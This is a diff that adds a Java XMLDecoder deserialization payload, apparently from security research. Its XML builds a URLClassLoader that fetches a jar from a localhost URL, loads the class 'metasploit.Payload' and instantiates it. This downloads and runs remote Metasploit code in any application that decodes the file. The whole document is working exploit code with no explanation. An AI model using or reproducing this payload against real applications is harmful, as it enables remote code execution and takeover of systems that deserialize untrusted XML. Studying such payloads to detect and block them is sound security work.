@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?> 
+<java version="1.6.0_65" class="java.beans.XMLDecoder"> 
+
+	<!-- URLClassLoader u = new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")}); -->
+
+	<object id="cl" class="java.net.URLClassLoader">	
+		<array class="java.net.URL" length="1"> 
+		 	<void index="0"> 
+		 		<object class="java.net.URL">	
+		 			<string>http://localhost/~alvaro/met.jar</string>
+		 		</object>
+			</void> 
+		</array> 
+	</object>
+
+	<!-- c.newInstance(); -->
+
+	<object idref="cl">	
+		<void id="c" method ="loadClass">
+			<string>metasploit.Payload</string>
+		</void>
+	</object>		
+
+	<object idref="c">	
+		<void method ="newInstance" />
+	</object>	
+
+</java> 
